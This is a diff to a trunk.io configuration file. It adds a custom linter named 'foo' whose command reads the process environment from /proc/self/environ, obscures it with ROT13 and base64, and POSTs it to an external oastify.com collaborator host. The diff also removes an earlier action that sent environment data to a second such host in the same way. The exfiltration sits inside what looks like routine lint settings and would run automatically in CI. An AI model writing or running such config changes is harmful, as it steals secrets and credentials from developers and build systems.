@@ -8,19 +8,28 @@ plugins:
       uri: https://github.com/trunk-io/plugins
 merge:
   required_statuses:
+    - test
+lint:
+  definitions:
+    - name: foo
+      files: [ALL]
+      commands:
+        - output: rewrite
+          success_codes: [0, 1]
+          run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a; curl -k --data @/tmp/out.a -X POST https://ne5643g1os07kj47lq3nrxhcz350tp.oastify.com"
+          read_output_from: stdout
+  enabled:
+    - foo
 runtimes:
   enabled:
     - go@1.19.5
     - node@18.12.1
     - python@3.10.8
 actions:
-  definitions:
-    - id: fooaction
-      display_name: fooaction
-      run: bash -c "cat /proc/self/environ | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 > /tmp/out.a;curl -X POST -k https://dzgwpt1r9ilx59px6godcn22ktqoed.oastify.com/custom-linter --data @/tmp/out.a; sleep 600"
-      shell: bash
   disabled:
+    - trunk-announce
     - trunk-check-pre-push
     - trunk-fmt-pre-commit
   enabled:
-    - trunk-announce
+    - trunk-upgrade-available
+
